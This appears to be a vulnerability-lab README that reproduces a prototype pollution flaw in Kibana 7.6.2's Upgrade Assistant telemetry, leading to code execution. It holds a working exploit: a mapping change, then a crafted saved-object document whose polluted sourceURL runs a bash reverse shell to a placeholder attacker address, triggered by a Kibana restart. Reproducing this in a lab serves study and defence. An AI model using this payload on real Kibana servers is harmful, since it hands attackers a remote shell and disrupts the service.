# Kibana 7.6.2 upgrade-assistant-telemetry Prototype Pollution Leads to RCE

[中文版本(Chinese version)](README.zh-cn.md)

Kibana is an open source data visualization dashboard for Elasticsearch.

Kibana versions prior to 7.6.3 suffer from a prototype pollution vulnerability in the Upgrade Assistant feature. By assigning a new value to `constructor.prototype.sourceURL`, arbitrary code execution becomes possible. The payload can be triggered either by sending data directly to Elasticsearch or by submitting queries through Kibana. Both methods result in Kibana reading the polluted prototype.

Execution occurs either after Kibana is restarted or when data collection takes place (at an unknown time). To restore functionality after the payload executes, the `.kibana_1` index must be deleted before restarting Kibana. Once a callback is received, cleanup is performed automatically, allowing Kibana to restart successfully.

References:

- https://hackerone.com/reports/852613

## Setup

Start Kibana 7.6.2 and Elasticsearch 7.6.2 using Docker:

```bash
docker compose up -d
```

Once the environment is running, Kibana will be accessible at `http://your-ip:5601`.

## Vulnerability Reproduction

The prototype pollution occurs in the Upgrade Assistant's `upgrade-assistant-telemetry`. This vulnerability can be exploited by providing a specially crafted `upgrade-assistant-telemetry` saved object.

1. Update Kibana Mappings: Modify Kibana mappings to allow the custom `upgrade-assistant-telemetry` document. The full mapping must be provided to avoid startup validation errors.

    ```json
    PUT /.kibana_1/_mappings
    {
    "properties": {
        "upgrade-assistant-telemetry": {
        "properties": {
            "constructor": {
            "properties": {
                "prototype": {
                "properties": {
                    "sourceURL": {
                    "type": "text",
                    "fields": {
                        "keyword": {
                        "type": "keyword",
                        "ignore_above": 256
                        }
                    }
                    }
                }
                }
            }
            },
            "features": {
            "properties": {
                "deprecation_logging": {
                "properties": {
                    "enabled": {
                    "type": "boolean",
                    "null_value": true
                    }
                }
                }
            }
            },
            "ui_open": {
            "properties": {
                "cluster": {
                "type": "long",
                "null_value": 0
                },
                "indices": {
                "type": "long",
                "null_value": 0
                },
                "overview": {
                "type": "long",
                "null_value": 0
                }
            }
            },
            "ui_reindex": {
            "properties": {
                "close": {
                "type": "long",
                "null_value": 0
                },
                "open": {
                "type": "long",
                "null_value": 0
                },
                "start": {
                "type": "long",
                "null_value": 0
                },
                "stop": {
                "type": "long",
                "null_value": 0
                }
            }
            }
        }
        }
    }
    }
    ```

2. Index the Payload Document: Use the following request to inject the malicious telemetry document.

    ```json
    PUT /.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry
    {
        "upgrade-assistant-telemetry" : {
        "ui_open.overview" : 1,
        "ui_open.cluster" : 1,
        "ui_open.indices" : 1,
        "constructor.prototype.sourceURL": "\u2028\u2029\nglobal.process.mainModule.require('child_process').exec('/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
        },
        "type" : "upgrade-assistant-telemetry",
        "updated_at" : "2020-04-17T20:47:40.800Z"
    }
    ```

    ![update kibana mappings](1.png)

    Note: This payload pollutes the prototype, injecting JavaScript code that spawns a reverse shell.The code can be customized. For example, `...exec('touch /tmp/rce')`.

3. Trigger Payload Execution: Wait for data collection to occur or manually restart Kibana ( `docker restart KIBANA_CONTAINER_ID` or `docker compose restart`). Kibana will attempt to start, execute the payload, crash, and restart in a loop.

    ![index doc status](2.png)
